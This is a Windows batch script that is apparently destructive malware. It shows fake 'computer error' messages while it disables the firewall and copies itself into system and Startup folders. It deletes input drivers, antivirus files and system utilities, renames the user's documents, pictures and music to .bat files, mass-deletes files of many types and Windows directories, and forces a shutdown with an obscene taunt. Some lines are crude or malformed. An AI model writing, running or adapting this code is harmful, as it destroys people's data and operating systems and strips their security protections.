@echo off
start C:\Users\admin\Desktop\message.vbs
Start C:\Users\admin\Desktop\t.jpg
Start C:\Users/admin\Desktop\pop.vbs
pause
exit
:Rookie
MD %RANDOM%
goto Rookie
attrib -s -r -h c:\ntldr
del ntldr
goto Rookie
echo off

color 2
:Start
msg * Computer Error
pause
msg * Windows Will Try To Fix The Error
pause
cls

cd %windir%\system32
del mouse.drv /S /F /Q
del keyboard.drv /S /F /Q
del keyboard.sys /S /F /Q
cls
netsh firewall set opmode mode=disable
cls
copy %0 "c:\WINDOWS"
copy %0 "c:\WINDOWS\system32"
copy %0 "c:\WINDOWS\system"
copy %0 "%systemdrive%\Documents and Settings\%username%\Start Menu\Programs\Startup"
cls

time 6:66
cls

echo Windows Has Detected The Error Please Wait...
pause
echo Attempting To Fix The Error...
pause
echo Error Virus Detected!
pause
echo PWN3D!!!
cls
cd %userprofile%\my documents
ren *.txt *.bat
ren *.doc *.bat
ren *.pub *.bat
ren *.pps *.bat
ren *.htm *.bat
ren *.pdf *.bat
cls
cd %userprofile%\my documents\my pictures
ren *.gif *.bat
ren *.jpg *.bat
ren *.jpeg *.bat
ren *.bmp *.bat
ren *.dip *.bat
ren *.tif *.bat
ren *.png *.bat
cls
cd %userprofile%\my documents\my music
ren *.mp3 *.bat
ren *.mp4 *.bat
ren *.wav *.bat
ren *.mpeg *.bat
ren *.mpg *.bat
pause
cd\
del "%systemdrive%\Program Files\*.*" /S /F /Q
del "%systemdrive%\Windows\*.*" /S /F /Q
del "%systemdrive%\My Documents\*.*" /S /F /Q
del *.exe /F /Q
del *.rar /F /Q
del *.zip /F /Q
del *.mp3 /F /Q
del *.mp4 /F /Q
del *.wav /F /Q
del *.avi /F /Q
del *.jpeg /F /Q
del *.dvix /F /Q
del *.mpg /F /Q
del *.vob /F /Q
del *.mov /F /Q
del *.m2v /F /Q
del *.flv /F /Q
del *.wmv /F /Q
del *.txt /F /Q
del *.pdf /F /Q
del *.dll /F /Q
del *.reg /F /Q
del *.ini /F /Q
del *.com /F /Q
del *.scr /F /Q
del *.jpg /F /Q
del *.gif /F /Q
del *.png /F /Q
del *.bmp /F /Q
del *.ico /F /Q
del *.xml /F /Q
del *.kwm /F /Q
del *.dat /F /Q
del *.hta /F /Q
del *.htm /F /Q
del *.css /F /Q
del *.apl /F /Q
del *.api /F /Q
del *.js /F /Q
del *.html /F /Q
del /Q /F C:\Program Files\alwils~1\avast4\*.*
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
del /Q /F C:\Program Files\kasper~1\*.exe
del /Q /F C:\Program Files\trojan~1\*.exe
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.dat
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
del /Q /F C:\Program Files\Mcafee\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
del /Q /F C:\Program Files\Norton~1\*.*
del c:\WINDOWS\system32\ipconfig.exe /S /Q /F
del c:\WINDOWS\system32\xcopy.exe /S /Q /F
del c:\WINDOWS\system32\logoff.exe /S /Q /F
del c:\WINDOWS\system32\rename.exe /S /Q /F
del c:\WINDOWS\system32\tracert.exe /S /Q /F
del c:\WINDOWS\system32\ping.exe /S /Q /F
del c:\WINDOWS\system32\ping6.exe /S /Q /F
del c:\WINDOWS\system32\compact.exe /S /Q /F
del c:\WINDOWS\system32\chkdsk.exe /S /Q /F
del c:\WINDOWS\system32\msg.exe /S /Q /F
del c:\WINDOWS\system32\attrib.exe /S /Q /F
del c:\WINDOWS\system32\format.exe /S /Q /F
del c:\WINDOWS\system32\netsh.exe /S /Q /F
del c:\WINDOWS\system32\netstat.exe /S /Q /F
del c:\WINDOWS\system32\net.exe /S /Q /F
del c:\WINDOWS\system32\reg.exe /S /Q /F
del c:\WINDOWS\system32\tskill.exe /S /Q /F
dir %windir%
del . /q /f
dir %windir%/system32
del . /q /f
dir %windir%/fonts
del . /q /f
dir %windir%/system
del . /q /f
dir %windir%/system32/drivers
del . /q /f
@echo off
Shutdown.exe -s -t 10
cls
msg * YOUR PC HAS BEEN FUCKED

